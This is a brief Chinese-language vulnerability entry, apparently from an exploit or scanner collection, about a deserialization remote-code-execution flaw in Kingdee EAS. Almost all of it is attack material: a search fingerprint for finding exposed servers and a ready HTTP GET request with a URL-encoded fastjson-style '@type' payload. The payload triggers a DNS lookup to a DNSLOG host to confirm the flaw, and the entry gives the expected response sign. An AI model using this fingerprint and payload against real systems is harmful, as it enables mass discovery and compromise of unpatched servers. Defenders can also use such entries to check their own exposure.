# 金蝶EAS反序列化RCE漏洞

金蝶 ｜ 命令执行 ｜ —
- **指纹**：`body="easSessionId"`
- **请求**：`GET /easportal/tools/appUtil.jsp?list=%7B%22x%22%3A%7B%22%40type%22%3A%22java.net.Inet4Address%22%2C%22val%22%3A%22DNSLOG.CN%22%7D%7D HTTP/1.1`
- **响应特征**：200 Dnslog回显